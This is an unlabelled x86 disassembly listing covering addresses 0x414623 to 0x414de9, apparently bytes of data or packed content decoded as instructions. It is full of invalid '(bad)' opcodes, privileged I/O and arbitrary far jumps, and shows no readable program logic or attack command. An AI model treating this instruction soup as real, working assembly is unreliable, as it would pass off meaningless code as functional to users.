  414623:	sbb    eax,0x153ff6f7
  414628:	stos   BYTE PTR es:[edi],al
  414629:	div    BYTE PTR [eax+0x1d1ac8b5]
  41462f:	test   eax,0x474765de
  414634:	int3   
  414635:	xchg   ecx,eax
  414636:	pop    ecx
  414637:	jle    0x414631
  414639:	(bad)  
  41463a:	stos   DWORD PTR es:[edi],eax
  41463b:	pop    ebx
  41463c:	sbb    eax,0xac6280b7
  414641:	mov    dh,0x86
  414643:	adc    eax,0xb0b03676
  414648:	and    al,0xf
  41464a:	and    bl,BYTE PTR [edx+0x49]
  41464d:	(bad)  
  41464e:	jge    0x4146ba
  414650:	mov    ds:0x375b7b39,eax
  414655:	cmp    edi,edx
  414657:	out    dx,al
  414658:	xchg   esp,eax
  414659:	push   edx
  41465a:	outs   dx,BYTE PTR ds:[esi]
  41465b:	jmp    0x670ed44c
  414660:	(bad)  
  414662:	push   ebx
  414663:	sub    eax,eax
  414665:	loopne 0x4146a0
  414667:	push   edx
  414668:	xlat   BYTE PTR ds:[ebx]
  414669:	pop    ss
  41466a:	sub    al,0x22
  41466c:	neg    ebx
  41466e:	adc    DWORD PTR [edi+esi*4],0x77d0ee71
  414675:	mov    edx,0xfefdbafc
  41467a:	push   ss
  41467b:	daa    
  41467c:	or     eax,0xecfac7e7
  414681:	das    
  414682:	adc    eax,0x126ec8f7
  414687:	xchg   esi,eax
  414688:	pop    ecx
  414689:	popf   
  41468a:	xlat   BYTE PTR ds:[ebx]
  41468b:	scas   eax,DWORD PTR es:[edi]
  41468c:	adc    eax,0xf4a3f4ca
  414691:	lds    ecx,FWORD PTR [esi]
  414693:	int    0xb0
  414695:	je     0x4146a7
  414697:	push   ecx
  414698:	aas    
  414699:	cmp    al,0x95
  41469b:	jb     0x4146b4
  41469d:	cdq    
  41469e:	push   edx
  41469f:	push   edx
  4146a0:	rcl    edx,0x76
  4146a3:	push   ds
  4146a4:	pop    esp
  4146a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a6:	sub    DWORD PTR [edx],0x25
  4146a9:	loop   0x41471f
  4146ab:	xchg   esp,eax
  4146ac:	call   0x928c:0xd6f0f33f
  4146b3:	dec    ebx
  4146b4:	daa    
  4146b5:	shl    bh,1
  4146b7:	sub    eax,0xf16a06c0
  4146bc:	mov    cs,WORD PTR [eax+0x9]
  4146bf:	lea    esp,[ecx+0x61]
  4146c2:	mov    dl,bl
  4146c4:	aam    0xa8
  4146c6:	fsubr  QWORD PTR ds:0x6d1feb1a
  4146cc:	xchg   BYTE PTR [eax+0x18],bl
  4146cf:	sub    eax,0xa12212d3
  4146d4:	xor    cl,BYTE PTR [edx-0x58]
  4146d7:	inc    ecx
  4146d8:	push   0x3a5c395b
  4146dd:	xchg   ebx,eax
  4146de:	or     ebp,DWORD PTR [edi-0x5a4612a3]
  4146e4:	sahf   
  4146e5:	scas   eax,DWORD PTR es:[edi]
  4146e6:	add    esp,DWORD PTR ds:0x6c71d9bf
  4146ec:	dec    ecx
  4146ed:	push   cs
  4146ee:	adc    eax,0xce6b7922
  4146f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146f4:	inc    ebp
  4146f5:	es ja  0x414693
  4146f8:	jmp    0x9516:0xc007cdb6
  4146ff:	fwait
  414700:	push   eax
  414701:	add    edx,DWORD PTR [edi-0x506a6170]
  414707:	jl     0x414785
  414709:	add    BYTE PTR [ecx-0x29],bl
  41470c:	mov    al,ds:0xb1c9d21c
  414711:	fdivr  st(3),st
  414713:	mov    BYTE PTR [ebx-0x25],dl
  414716:	and    esi,DWORD PTR [edi+0x5f]
  414719:	lahf   
  41471a:	and    BYTE PTR [ebp+0x1b],0xaa
  41471e:	mov    dl,0x10
  414720:	pop    esi
  414721:	outs   dx,DWORD PTR ds:[esi]
  414722:	call   DWORD PTR [edx+0x31]
  414725:	lock push esp
  414727:	push   ecx
  414728:	cmp    DWORD PTR ds:0x8f67099f,edi
  41472e:	sub    edx,esi
  414730:	inc    edi
  414731:	sbb    cl,BYTE PTR [ebx+0x56576af3]
  414737:	mov    al,ds:0x33386499
  41473c:	(bad)  
  41473d:	loope  0x414774
  41473f:	jle    0x41472e
  414741:	sahf   
  414742:	cdq    
  414743:	mov    edx,0x64767572
  414748:	iret   
  414749:	test   BYTE PTR [edx-0x6],cl
  41474c:	cmp    dl,BYTE PTR [ecx-0x63]
  41474f:	ret    0x2d3d
  414752:	jmp    0x4c51fbf8
  414757:	or     al,0xd4
  414759:	(bad)  
  41475a:	rep lods al,BYTE PTR ds:[esi]
  41475c:	pop    ss
  41475d:	push   eax
  41475e:	je     0x41470b
  414760:	(bad)  
  414761:	pop    eax
  414762:	or     eax,0x1daf4a1b
  414767:	jl     0x4146f0
  414769:	lahf   
  41476a:	xchg   DWORD PTR [edi+0xe],ecx
  41476d:	or     DWORD PTR [ecx],edi
  41476f:	mov    ebx,0x9a432465
  414774:	jg     0x414738
  414776:	pusha  
  414777:	xor    BYTE PTR [edx],bh
  414779:	sti    
  41477a:	sbb    cl,BYTE PTR [edi+0x5a]
  41477d:	mov    ch,0x9a
  41477f:	ret    
  414780:	pop    esi
  414781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414782:	mov    ebp,0x398a733e
  414787:	mov    ebp,0xd5799fa2
  41478c:	lods   al,BYTE PTR ds:[esi]
  41478d:	push   esp
  41478e:	lds    ebp,FWORD PTR [edi]
  414790:	adc    al,0xf2
  414792:	mov    ?,ebp
  414794:	adc    dl,BYTE PTR [ebx+0x9]
  414797:	fdivr  DWORD PTR [eax]
  414799:	(bad)  
  41479a:	jg     0x4147d6
  41479c:	or     DWORD PTR [ebp-0x2bcf8b1d],0xffffffaf
  4147a3:	push   0x58
  4147a5:	in     eax,0x6
  4147a7:	lahf   
  4147a8:	adc    DWORD PTR [edx+0x78],0x8496e7ab
  4147af:	(bad)  
  4147b0:	call   DWORD PTR [edi]
  4147b2:	stos   DWORD PTR es:[edi],eax
  4147b3:	mov    ebx,DWORD PTR [edi-0x7b29d9d6]
  4147b9:	dec    esp
  4147ba:	pop    ss
  4147bb:	xor    ebp,DWORD PTR [ebp-0x5cc1eabe]
  4147c1:	or     dh,BYTE PTR [edx]
  4147c3:	mov    ebx,0x2a57de1f
  4147c8:	ss pop eax
  4147ca:	fsub   QWORD PTR [edx+ebp*1]
  4147cd:	add    ecx,DWORD PTR ss:[ecx+0x7a49daf9]
  4147d4:	lea    esi,[edx]
  4147d6:	sbb    al,0x17
  4147d8:	fnstenv [edi+0xbcb7aec]
  4147de:	pusha  
  4147df:	and    esp,0xffffffd8
  4147e2:	int3   
  4147e3:	test   DWORD PTR [ebp+0x6509d679],esp
  4147e9:	or     eax,0x5e117bec
  4147ee:	xor    esp,0x9
  4147f1:	inc    eax
  4147f2:	push   0xc386524d
  4147f7:	and    ecx,DWORD PTR [edi-0x58215afb]
  4147fd:	clc    
  4147fe:	ins    BYTE PTR es:[edi],dx
  4147ff:	out    0x4,al
  414801:	pop    ebx
  414802:	mov    ch,0x7f
  414804:	push   ss
  414805:	push   eax
  414806:	loope  0x4147da
  414808:	imul   esi,DWORD PTR [ecx+0x18],0x21
  41480c:	sti    
  41480d:	mov    dh,0xe1
  41480f:	sar    bl,cl
  414811:	add    esi,DWORD PTR [esp+ecx*8-0x6ccea776]
  414818:	ss int 0x6f
  41481b:	add    DWORD PTR [esi-0x1415e1dd],ebx
  414821:	in     eax,dx
  414822:	jl     0x414818
  414824:	pop    ebp
  414825:	pop    ebx
  414826:	add    al,0x61
  414828:	mov    al,0x68
  41482a:	sbb    dl,BYTE PTR [eax-0x407764dc]
  414830:	sbb    edx,esi
  414832:	push   0x6f76c039
  414837:	ret    
  414838:	inc    ebp
  414839:	or     BYTE PTR [edx+0x6d24de56],bl
  41483f:	retf   0x9329
  414842:	shl    DWORD PTR [edx],0x30
  414845:	hlt    
  414846:	test   BYTE PTR [ebx],cl
  414848:	je     0x414863
  41484a:	push   esp
  41484b:	ret    0x18f4
  41484e:	cdq    
  41484f:	imul   ebx,DWORD PTR [esi],0x4
  414852:	pop    ebp
  414853:	pushf  
  414854:	mov    eax,ds:0xd3d1d038
  414859:	pop    ecx
  41485a:	aam    0xb4
  41485c:	enter  0x92f0,0x11
  414860:	dec    eax
  414861:	pop    ebx
  414862:	jmp    0x41481e
  414864:	sub    al,0x33
  414866:	lods   al,BYTE PTR ds:[esi]
  414867:	in     eax,dx
  414868:	sahf   
  414869:	fcomp  DWORD PTR [ebx]
  41486b:	cmp    dh,ch
  41486d:	sbb    al,BYTE PTR [esi]
  41486f:	into   
  414870:	dec    esi
  414871:	xchg   ecx,eax
  414872:	pop    esi
  414873:	retf   
  414874:	aad    0xa4
  414876:	shl    DWORD PTR [ebx+0x30ac93f1],1
  41487c:	iret   
  41487d:	push   ds
  41487e:	pop    ebx
  41487f:	dec    esi
  414880:	jg     0x414882
  414882:	cmp    DWORD PTR [ebx+0x24],ecx
  414885:	mov    esp,DWORD PTR [ecx]
  414887:	xlat   BYTE PTR ds:[ebx]
  414888:	dec    esi
  414889:	xchg   BYTE PTR [edi+0x2e],bh
  41488c:	repnz mov ecx,0x87579fdf
  414892:	cmp    BYTE PTR [eax-0x8],0xf1
  414896:	jbe    0x41482b
  414898:	dec    ecx
  414899:	sahf   
  41489a:	push   es
  41489b:	int    0x5e
  41489d:	out    dx,eax
  41489e:	retf   
  41489f:	xchg   eax,ebx
  4148a1:	(bad)  
  4148a2:	mov    ds:0x39285107,al
  4148a7:	jno    0x41483b
  4148a9:	or     BYTE PTR [ebp-0x59105aff],cl
  4148af:	popf   
  4148b0:	cmp    ecx,esi
  4148b2:	fs ret 0x19c4
  4148b6:	mov    ch,0x61
  4148b8:	ror    DWORD PTR [esp+eiz*8+0x14065d2b],1
  4148bf:	addr16 cmc 
  4148c1:	jns    0x4148ba
  4148c3:	int    0x70
  4148c5:	cmp    ebp,edi
  4148c7:	leave  
  4148c8:	jne    0x4148a3
  4148ca:	add    al,0x57
  4148cc:	call   0x16eadeb5
  4148d1:	mov    ah,0x76
  4148d3:	fidivr WORD PTR [eax]
  4148d5:	and    eax,0x4bbc3c9d
  4148da:	clc    
  4148db:	daa    
  4148dc:	inc    ebp
  4148dd:	mov    edx,0xf67317b3
  4148e2:	or     ah,bh
  4148e4:	pop    ds
  4148e5:	jne    0x4148e1
  4148e7:	inc    eax
  4148e8:	xchg   ecx,eax
  4148e9:	dec    edx
  4148ea:	push   ds
  4148eb:	mov    eax,0x2aa3e564
  4148f0:	cmp    ebx,ebp
  4148f2:	dec    ebp
  4148f3:	aaa    
  4148f4:	fcmovb st,st(0)
  4148f6:	aad    0x27
  4148f8:	lock pop edi
  4148fa:	xchg   esp,eax
  4148fb:	push   ds
  4148fc:	xor    BYTE PTR [edi-0x4d],ch
  4148ff:	jbe    0x414950
  414901:	sbb    DWORD PTR [ebp+edx*1-0x3d],0x52
  414906:	ds repz inc ecx
  414909:	rol    DWORD PTR [ecx+0xd],0x52
  41490d:	mov    ah,0xc3
  41490f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414910:	shr    DWORD PTR [edi-0x25a89dff],1
  414916:	popa   
  414917:	rol    DWORD PTR [eax],1
  414919:	jno    0x4148a4
  41491b:	out    dx,al
  41491c:	icebp  
  41491d:	rol    DWORD PTR [esi],1
  41491f:	xchg   ebp,eax
  414920:	test   al,0x51
  414922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414923:	pop    ds
  414924:	aam    0x39
  414926:	addr16 pop edi
  414928:	not    BYTE PTR [ecx]
  41492a:	bound  ebp,QWORD PTR [eax+0x76]
  41492d:	push   ds
  41492e:	dec    edi
  41492f:	adc    DWORD PTR [eax+0x74d88fc8],esi
  414935:	pop    edx
  414936:	icebp  
  414937:	call   0x7544:0xfda4b71a
  41493e:	dec    esi
  41493f:	shr    BYTE PTR [ecx],0x92
  414942:	xlat   BYTE PTR ds:[ebx]
  414943:	dec    ecx
  414944:	xor    DWORD PTR [ecx-0x42],esi
  414947:	mov    DWORD PTR [ebp+0x4a],eax
  41494a:	sbb    ebp,esi
  41494c:	lea    edi,[ecx]
  41494e:	cmc    
  41494f:	cmp    ebx,DWORD PTR [ecx+ebx*1]
  414952:	xchg   ebp,eax
  414953:	sub    eax,0x2e2899e5
  414958:	daa    
  414959:	push   0xffffff9f
  41495b:	dec    esi
  41495c:	and    DWORD PTR [edi+0x4c],ebp
  41495f:	push   es
  414960:	inc    ecx
  414961:	mov    esi,0xec0ceb7c
  414966:	mov    al,0xbc
  414968:	adc    dh,BYTE PTR [edx-0x45cb626f]
  41496e:	pusha  
  41496f:	sbb    edi,ecx
  414971:	pop    ebp
  414972:	dec    edi
  414973:	gs add bl,0x84
  414977:	mov    ds:0xd6b03168,eax
  41497c:	lods   al,BYTE PTR ds:[esi]
  41497d:	jb     0x414928
  41497f:	aad    0xa1
  414981:	das    
  414982:	aas    
  414983:	ds inc ebp
  414985:	iret   
  414986:	ror    BYTE PTR [ebp-0x6e1612f1],1
  41498c:	cmp    al,0xeb
  41498e:	loope  0x414922
  414990:	jp     0x41494d
  414992:	inc    esp
  414993:	pop    ds
  414994:	cld    
  414995:	jb     0x414a09
  414997:	in     al,0xc4
  414999:	loopne 0x4149ca
  41499b:	xchg   edx,eax
  41499c:	sbb    DWORD PTR [ebp+edi*4+0x28],ebx
  4149a0:	rcr    BYTE PTR [edi-0x12],cl
  4149a3:	je     0x414999
  4149a5:	aaa    
  4149a6:	sbb    al,0xcd
  4149a8:	push   ebx
  4149a9:	dec    edx
  4149aa:	mov    al,0xc0
  4149ac:	iret   
  4149ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ae:	in     al,dx
  4149af:	and    cl,BYTE PTR [eax]
  4149b1:	(bad)  
  4149b2:	std    
  4149b3:	cmp    eax,0xe62c222a
  4149b8:	sub    al,0x27
  4149ba:	jbe    0x414956
  4149bc:	xor    edx,DWORD PTR [ebx]
  4149be:	lds    esi,FWORD PTR [edx]
  4149c0:	xchg   ecx,eax
  4149c1:	hlt    
  4149c2:	add    eax,0xa4c25917
  4149c7:	test   al,0x93
  4149c9:	push   eax
  4149ca:	iret   
  4149cb:	pop    edi
  4149cc:	inc    ebp
  4149cd:	test   DWORD PTR [esi-0x37c57e38],0xffd293ad
  4149d7:	das    
  4149d8:	outs   dx,DWORD PTR ds:[esi]
  4149d9:	or     DWORD PTR [esi+edi*1+0xba3e98a],ecx
  4149e0:	dec    ecx
  4149e1:	sbb    esi,ecx
  4149e3:	add    BYTE PTR [edi],0xbb
  4149e6:	sub    BYTE PTR [edx-0x14],ah
  4149e9:	push   esp
  4149ea:	imul   ecx,DWORD PTR [ebx-0x3f88ca72],0x35
  4149f1:	fild   DWORD PTR [edi-0x63a6c2cd]
  4149f7:	push   esp
  4149f8:	pushf  
  4149f9:	fistp  WORD PTR [eax+0x49a5f194]
  4149ff:	cmp    al,ch
  414a01:	out    dx,al
  414a02:	push   ss
  414a03:	(bad)  [edx+0x79]
  414a06:	enter  0xc7b5,0xc5
  414a0a:	outs   dx,DWORD PTR ds:[esi]
  414a0b:	neg    esi
  414a0d:	das    
  414a0e:	popa   
  414a0f:	ss or  dl,dh
  414a12:	jmp    0xf3e0046b
  414a17:	loope  0x414a4a
  414a19:	(bad)  
  414a1a:	fisttp DWORD PTR [edi-0x39]
  414a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a1e:	popa   
  414a1f:	xchg   DWORD PTR [ebx+esi*2-0xe5cc50f],ebp
  414a26:	or     ah,dl
  414a28:	push   edi
  414a29:	dec    ecx
  414a2a:	retf   0xaf8
  414a2d:	jg     0x4149fa
  414a2f:	pop    edi
  414a30:	aam    0x48
  414a32:	(bad)  
  414a33:	stc    
  414a34:	inc    ecx
  414a35:	sahf   
  414a36:	mov    dh,0x83
  414a38:	out    0xfa,al
  414a3a:	pop    ss
  414a3b:	icebp  
  414a3c:	xchg   ebp,eax
  414a3d:	xor    BYTE PTR [esi],dh
  414a3f:	jl     0x4149dc
  414a41:	sub    eax,0x1a660265
  414a46:	jmp    0xeb00:0x68c21bcc
  414a4d:	loop   0x414acd
  414a4f:	sub    bh,dl
  414a51:	push   edi
  414a52:	shl    bl,cl
  414a54:	cmc    
  414a55:	xor    BYTE PTR [eax-0x50],dl
  414a58:	leave  
  414a59:	mov    cl,0xc6
  414a5b:	sahf   
  414a5c:	stos   BYTE PTR es:[edi],al
  414a5d:	popa   
  414a5e:	lock xor al,0x14
  414a61:	arpl   WORD PTR [esi-0x75cdc14d],si
  414a67:	sub    eax,0xa55f1924
  414a6c:	addr16 cmc 
  414a6e:	jmp    0x8d38:0x47d6e5bb
  414a75:	pop    esi
  414a76:	mov    WORD PTR [ebx+0x16],ss
  414a79:	cwde   
  414a7a:	in     al,0xdd
  414a7c:	jl     0x414a0c
  414a7e:	and    ebx,ecx
  414a80:	dec    edi
  414a81:	lods   eax,DWORD PTR cs:[esi]
  414a83:	inc    esi
  414a84:	call   0xdca3:0xdd8aac70
  414a8b:	push   ecx
  414a8c:	out    0x11,eax
  414a8e:	repz xlat BYTE PTR ds:[ebx]
  414a90:	imul   esi,DWORD PTR [edx+0x925bec3],0xfc5119da
  414a9a:	test   BYTE PTR [ecx],bl
  414a9c:	and    esp,DWORD PTR [ecx-0x53540dc0]
  414aa2:	stc    
  414aa3:	scas   al,BYTE PTR es:[edi]
  414aa4:	add    al,0xa
  414aa6:	iret   
  414aa7:	out    0xfb,al
  414aa9:	les    edx,FWORD PTR [ecx-0x5b]
  414aac:	fs sahf 
  414aae:	add    edx,0xb05bce2
  414ab4:	imul   eax,DWORD PTR [ebx+0x18],0x30
  414ab8:	dec    DWORD PTR [esi-0x5b619774]
  414abe:	dec    edx
  414abf:	aaa    
  414ac0:	fs xchg esi,esi
  414ac3:	pop    eax
  414ac4:	push   es
  414ac5:	lods   al,BYTE PTR ds:[esi]
  414ac6:	xchg   ecx,eax
  414ac7:	mov    ch,0x33
  414ac9:	sbb    BYTE PTR [ebx+0x1d],cl
  414acc:	or     dh,BYTE PTR [edx+0x67d050a7]
  414ad2:	xor    al,BYTE PTR [eax]
  414ad4:	dec    ecx
  414ad5:	lea    edx,[ecx-0x6014669b]
  414adb:	sub    BYTE PTR [edi-0x67633444],ah
  414ae1:	adc    eax,0x3c48b033
  414ae6:	fwait
  414ae7:	(bad)  
  414ae8:	aam    0x5f
  414aea:	xchg   esi,eax
  414aeb:	shl    ch,0xde
  414aee:	call   FWORD PTR [edi+0x6c]
  414af1:	jl     0x414afb
  414af3:	xor    eax,0xf491c8c
  414af8:	cmc    
  414af9:	or     eax,0x362c4587
  414afe:	xchg   edi,eax
  414aff:	cmp    esp,0xa96ea667
  414b05:	mov    ecx,0xabf049ad
  414b0a:	les    ebp,FWORD PTR [eax+edi*2+0x58d32115]
  414b11:	imul   esp,DWORD PTR [ecx],0xfaab444e
  414b17:	dec    eax
  414b18:	xlat   BYTE PTR ds:[ebx]
  414b19:	and    DWORD PTR [ecx-0x49],0x24d446a3
  414b20:	or     ebp,ebx
  414b22:	dec    esp
  414b23:	rcl    BYTE PTR [edx+0x484c82df],0xe6
  414b2a:	pushf  
  414b2b:	fsubr  st,st(4)
  414b2d:	clc    
  414b2e:	sbb    eax,0x353331b8
  414b33:	out    dx,al
  414b34:	inc    esp
  414b35:	mov    ebx,0x32cfb66a
  414b3a:	into   
  414b3b:	xor    esi,DWORD PTR [ecx-0x2d]
  414b3e:	jg     0x414af5
  414b40:	adc    eax,0x3befd665
  414b45:	push   edx
  414b46:	aas    
  414b47:	mov    bl,0x20
  414b49:	in     al,0x52
  414b4b:	fdivr  st(4),st
  414b4d:	mov    bh,0x1a
  414b4f:	mov    BYTE PTR [ebp-0x29ee3cfd],cl
  414b55:	or     BYTE PTR [ebp+0x79],dl
  414b58:	jl     0x414b46
  414b5a:	lea    edx,[ebx+ecx*2]
  414b5d:	dec    ebx
  414b5e:	xor    bh,bl
  414b60:	jecxz  0x414af6
  414b62:	hlt    
  414b63:	and    al,BYTE PTR [edi+0x56]
  414b66:	shr    DWORD PTR [ecx+eax*8-0x63901ba5],0xda
  414b6e:	add    eax,0x91ce5fd6
  414b73:	into   
  414b74:	scas   eax,DWORD PTR es:[edi]
  414b75:	dec    eax
  414b76:	cs or  DWORD PTR fs:[eax+0x4a],ecx
  414b7b:	adc    edx,DWORD PTR [edx-0x61e6aec8]
  414b81:	(bad)  
  414b82:	mov    ecx,0x84ad8289
  414b87:	icebp  
  414b88:	inc    esp
  414b89:	push   0xffffffd9
  414b8b:	fwait
  414b8c:	mov    esi,0xf74a6797
  414b91:	je     0x414bfd
  414b93:	loope  0x414b55
  414b95:	adc    al,0x9d
  414b97:	ds std 
  414b99:	xchg   edx,eax
  414b9a:	mov    ebp,0xc233e9ab
  414b9f:	out    0xfd,al
  414ba1:	popf   
  414ba2:	xor    dl,BYTE PTR [ebp-0x5d]
  414ba5:	push   esi
  414ba6:	aam    0x6
  414ba8:	sub    al,0x99
  414baa:	mov    BYTE PTR [ebx],al
  414bac:	jecxz  0x414bf1
  414bae:	(bad)  
  414baf:	ror    DWORD PTR [edi-0x2],1
  414bb2:	mov    edx,0x4f788bd5
  414bb7:	mov    ch,0x97
  414bb9:	jg     0x414ba7
  414bbb:	fistp  WORD PTR [edi]
  414bbd:	dec    esp
  414bbe:	jl     0x414c03
  414bc0:	dec    esp
  414bc1:	sbb    BYTE PTR [ebx+0x3cdff643],bl
  414bc7:	out    0xe0,al
  414bc9:	sub    ch,BYTE PTR [edi+0x3a9ad66f]
  414bcf:	cld    
  414bd0:	adc    BYTE PTR [esi-0x674e7d82],0x9d
  414bd7:	shl    DWORD PTR [edx+0x152ef140],1
  414bdd:	cmp    DWORD PTR [ecx+0x441e8005],ebx
  414be3:	hlt    
  414be4:	push   0x1ab94921
  414be9:	out    dx,eax
  414bea:	xor    eax,0x885da055
  414bef:	adc    eax,0xdd5021b1
  414bf4:	clc    
  414bf5:	or     bl,BYTE PTR [esi+0x3d23c2eb]
  414bfb:	fild   QWORD PTR [eax-0x30948942]
  414c01:	std    
  414c02:	push   eax
  414c03:	repnz sub BYTE PTR [edx-0x39d4fa14],dl
  414c0a:	not    BYTE PTR [ebp-0x3cd1c32c]
  414c10:	pop    ebp
  414c11:	pop    es
  414c12:	xchg   esi,eax
  414c13:	out    0xc0,eax
  414c15:	aas    
  414c16:	ins    DWORD PTR es:[edi],dx
  414c17:	std    
  414c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c19:	pusha  
  414c1a:	push   0x3481d8b0
  414c1f:	inc    edx
  414c20:	add    eax,0x4a343929
  414c25:	ins    DWORD PTR es:[edi],dx
  414c26:	sahf   
  414c27:	shl    BYTE PTR [ecx+ebx*8],0x37
  414c2b:	retf   
  414c2c:	sti    
  414c2d:	push   cs
  414c2e:	jno    0x414c6b
  414c30:	imul   DWORD PTR [edi]
  414c32:	(bad)  
  414c33:	stc    
  414c34:	jns    0x414be0
  414c36:	mov    esp,0xc4605f48
  414c3b:	clc    
  414c3c:	add    esi,0x69d44f5
  414c42:	mov    edx,0xf3c598a0
  414c47:	scas   eax,DWORD PTR es:[edi]
  414c48:	pop    ds
  414c49:	ja     0x414c1a
  414c4b:	or     eax,0xe1ea5647
  414c50:	loope  0x414bf6
  414c52:	pop    ecx
  414c53:	xchg   ebp,eax
  414c54:	pushf  
  414c55:	mov    al,ds:0x54be1639
  414c5a:	push   cs
  414c5b:	cmp    ch,BYTE PTR [edi+0x33627850]
  414c61:	ins    DWORD PTR es:[edi],dx
  414c62:	add    BYTE PTR [edx],0x56
  414c65:	xchg   esp,eax
  414c66:	or     BYTE PTR [edx+0x3c],dl
  414c69:	pop    esi
  414c6a:	popa   
  414c6b:	mov    eax,ds:0xefc81c7a
  414c70:	xchg   DWORD PTR [edx+0x4a],esi
  414c73:	stos   BYTE PTR es:[edi],al
  414c74:	imul   eax,DWORD PTR [eax+0x14b5279f],0xffffff9c
  414c7b:	icebp  
  414c7c:	adc    ecx,DWORD PTR [ebp-0x7aa68b16]
  414c82:	mov    al,dh
  414c84:	in     al,dx
  414c85:	(bad)  
  414c86:	xchg   ecx,eax
  414c87:	sub    eax,0xb2934979
  414c8c:	outs   dx,BYTE PTR ds:[esi]
  414c8d:	jle    0x414c6a
  414c8f:	enter  0x11df,0x9d
  414c93:	dec    ebp
  414c94:	pop    ebp
  414c95:	pusha  
  414c96:	inc    edi
  414c97:	jb     0x414c91
  414c99:	(bad)  
  414c9a:	aam    0x26
  414c9c:	pop    ss
  414c9d:	jae    0x414c29
  414c9f:	xchg   esp,eax
  414ca0:	push   es
  414ca1:	adc    eax,0xc33fa527
  414ca6:	lock adc BYTE PTR [ecx+0x3b],0x96
  414cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cac:	jbe    0x414c3e
  414cae:	test   al,0x55
  414cb0:	sbb    DWORD PTR [eax-0x433683c7],ebp
  414cb6:	adc    esi,esp
  414cb8:	shl    DWORD PTR [edx],1
  414cba:	aas    
  414cbb:	mov    BYTE PTR [ebx],dl
  414cbd:	dec    edi
  414cbe:	scas   eax,DWORD PTR es:[edi]
  414cbf:	aaa    
  414cc0:	sahf   
  414cc1:	jns    0x414cce
  414cc3:	and    BYTE PTR [eax-0x3bc68464],cl
  414cc9:	mov    al,0x15
  414ccb:	xchg   edi,eax
  414ccc:	add    eax,0xb2146050
  414cd1:	lock loop 0x414ce5
  414cd4:	retf   
  414cd5:	and    dl,BYTE PTR [ebx+ecx*2]
  414cd8:	mov    cl,0xe4
  414cda:	(bad)  
  414cdb:	mov    ebp,0x5724d2f9
  414ce0:	in     al,0xd2
  414ce2:	or     bh,bl
  414ce4:	aam    0xcd
  414ce6:	or     ebp,ecx
  414ce8:	cmp    esi,DWORD PTR [edx]
  414cea:	cmp    eax,edi
  414cec:	pusha  
  414ced:	cmp    ah,bl
  414cef:	pop    esp
  414cf0:	pop    esp
  414cf1:	push   ebp
  414cf2:	jno    0x414cb8
  414cf4:	xchg   ecx,eax
  414cf5:	add    eax,0x84901325
  414cfa:	inc    ebx
  414cfb:	xor    eax,0x96098f40
  414d00:	xchg   esp,eax
  414d01:	pop    ss
  414d02:	and    bl,ch
  414d04:	cmc    
  414d05:	xlat   BYTE PTR ds:[ebx]
  414d06:	outs   dx,DWORD PTR ds:[esi]
  414d07:	fbld   TBYTE PTR [esi]
  414d09:	inc    ebx
  414d0a:	out    0x5c,al
  414d0c:	ror    dl,1
  414d0e:	xlat   BYTE PTR ds:[ebx]
  414d0f:	and    esp,ebx
  414d11:	stos   BYTE PTR es:[edi],al
  414d12:	jge    0x414d23
  414d14:	(bad)  
  414d15:	call   0xbf73:0xa4e63e82
  414d1c:	inc    eax
  414d1d:	ret    0xde0a
  414d20:	push   0xee34c892
  414d25:	jns    0x414cf2
  414d27:	add    BYTE PTR [ebx],bl
  414d29:	sub    edi,DWORD PTR [esi]
  414d2b:	add    BYTE PTR [ebx],bh
  414d2d:	into   
  414d2e:	gs mov bl,0x44
  414d31:	adc    eax,DWORD PTR [esi+0x562e656a]
  414d37:	loopne 0x414d46
  414d39:	mov    dl,0x6c
  414d3b:	addr16 dec eax
  414d3d:	mov    ebx,0xf240859e
  414d42:	add    dh,0x15
  414d45:	in     al,dx
  414d46:	xor    al,0x3
  414d48:	icebp  
  414d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d4a:	xor    dh,dh
  414d4c:	add    DWORD PTR [edx-0xf],eax
  414d4f:	adc    BYTE PTR [esp+esi*8-0x16240843],dl
  414d56:	mov    edx,0x726c635
  414d5b:	lods   eax,DWORD PTR ds:[esi]
  414d5c:	cld    
  414d5d:	pop    ebx
  414d5e:	pop    ds
  414d5f:	in     eax,dx
  414d60:	call   DWORD PTR [eax]
  414d62:	xor    esp,DWORD PTR [edi]
  414d64:	int3   
  414d65:	push   esi
  414d66:	mov    edx,0x66483e18
  414d6b:	test   DWORD PTR [edx],esi
  414d6d:	xchg   edx,eax
  414d6e:	and    DWORD PTR [esi],ebp
  414d70:	add    ebx,edx
  414d72:	push   edi
  414d73:	jecxz  0x414dd2
  414d75:	jmp    0x414db7
  414d77:	push   edi
  414d78:	cs out dx,al
  414d7a:	repnz fwait
  414d7c:	in     eax,dx
  414d7d:	xor    al,0x30
  414d7f:	ror    BYTE PTR [esi+0x75862ae0],1
  414d85:	mov    esi,0x86b67e5a
  414d8a:	and    bl,BYTE PTR [ecx]
  414d8c:	add    eax,0xd5715ada
  414d91:	or     DWORD PTR [edx-0x2f],0xe4aaa586
  414d98:	das    
  414d99:	sbb    BYTE PTR [edx+edi*4-0x29f778ec],dh
  414da0:	(bad)  
  414da1:	idiv   BYTE PTR [edx+0x16bd3ff1]
  414da7:	nop
  414da8:	xchg   ebx,eax
  414da9:	sbb    DWORD PTR [edx-0x21],0xffffffc7
  414dad:	outs   dx,BYTE PTR ds:[esi]
  414dae:	stos   DWORD PTR es:[edi],eax
  414daf:	or     DWORD PTR [ebx-0x6e56984],ebx
  414db5:	xor    eax,0xbb20999b
  414dba:	test   al,0x3f
  414dbc:	ror    DWORD PTR [ebp+0x6950360],cl
  414dc2:	es pop es
  414dc4:	imul   ecx,DWORD PTR [ebp+ebp*8-0x4af61a29],0x4075da07
  414dcf:	push   eax
  414dd0:	out    dx,al
  414dd1:	aam    0xff
  414dd3:	call   0xaf8:0x584598bd
  414dda:	xchg   ebx,eax
  414ddb:	sbb    eax,0x8ccd1943
  414de0:	repz sub BYTE PTR ds:[eax-0x6c3b77bf],bl
  414de8:	pop    es
  414de9:	arpl   WORD PTR [edi-0x61022eaa],sp
